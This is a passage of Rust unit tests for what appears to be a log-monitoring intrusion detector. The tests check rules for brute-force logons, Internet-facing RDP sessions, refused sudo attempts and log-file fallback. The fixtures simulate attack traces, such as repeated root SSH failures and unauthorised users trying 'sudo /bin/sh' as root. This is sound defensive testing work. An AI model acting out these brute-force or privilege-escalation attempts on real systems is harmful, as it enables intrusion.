            .collect::<Vec<_>>();
        found.sort();
        assert_eq!(
            found,
            [
                "Sigma: Force brute sur l'ouverture de session Windows",
                "Sigma: Échecs répétés d'ouverture de session pour un compte Windows"
            ]
        );

        let rdp = |ip: &str| {
            windows(
                100,
                4624,
                "Security",
                serde_json::json!({"LogonType": "10", "IpAddress": ip, "TargetUserName": "bob"}),
            )
        };
        assert_eq!(
            titles(&analysis.evaluate(vec![rdp("203.0.113.9")], later)),
            ["Sigma: Ouverture de session Bureau à distance depuis Internet"]
        );
        assert!(
            analysis
                .evaluate(vec![rdp("192.168.1.20")], later)
                .incidents
                .is_empty()
        );
        assert!(
            analysis
                .evaluate(vec![rdp("-")], later)
                .incidents
                .is_empty()
        );
    }

    #[test]
    fn one_pass_raises_a_bounded_number_of_incidents() {
        let mut analysis = analysis();
        // One refused sudo per account: as many groups as accounts.
        let logs: Vec<DecodedLog> = (0..MAX_INCIDENTS_PER_PASS + 15)
            .map(|n| {
                line(
                    n as i64,
                    "sudo",
                    &format!("user{n} : user NOT in sudoers ; TTY=pts/1 ; PWD=/ ; USER=root ; COMMAND=/bin/sh"),
                )
            })
            .collect();
        let findings = analysis.evaluate(logs, now() + Duration::hours(1));
        assert_eq!(findings.incidents.len(), MAX_INCIDENTS_PER_PASS);
    }

    #[test]
    fn a_line_dated_in_the_future_is_counted_at_the_time_it_is_read() {
        let mut analysis = analysis();
        let logs: Vec<DecodedLog> = (0..8)
            .map(|second| failed_ssh(86_400 * 30 + second, "203.0.113.9", "root"))
            .collect();
        // Read "now": all eight are at the same instant, and still a burst.
        let findings = analysis.evaluate(logs, now());
        assert_eq!(findings.incidents.len(), 1);
        assert!(
            findings
                .records
                .iter()
                .all(|record| record.timestamp <= now())
        );
    }

    #[test]
    fn the_authentication_logs_stand_in_for_a_journal_that_cannot_be_followed() {
        let dir = tempfile::tempdir().unwrap();
        let auth = dir.path().join("auth.log");
        let secure = dir.path().join("secure");
        std::fs::write(&auth, "").unwrap();
        let auth = auth.to_string_lossy().to_string();
        let secure = secure.to_string_lossy().to_string();

        // Already declared: followed once. Absent: not followed.
        let declared = LogFileConfig {
            path: auth.clone(),
            format: LogFileFormat::Syslog,
            service: None,
        };
        let (mut tailer, _) = LogFileTailer::new(&[declared], None);
        assert!(follow_fallback_files(&mut tailer, &[&auth, &secure]).is_empty());

        let (mut tailer, _) = LogFileTailer::new(&[], None);
        let added = follow_fallback_files(&mut tailer, &[&auth, &secure]);
        assert_eq!(added, std::slice::from_ref(&auth));
        assert!(tailer.is_following(&auth));
        assert_eq!(tailer.services(), ["auth"]);
    }
}
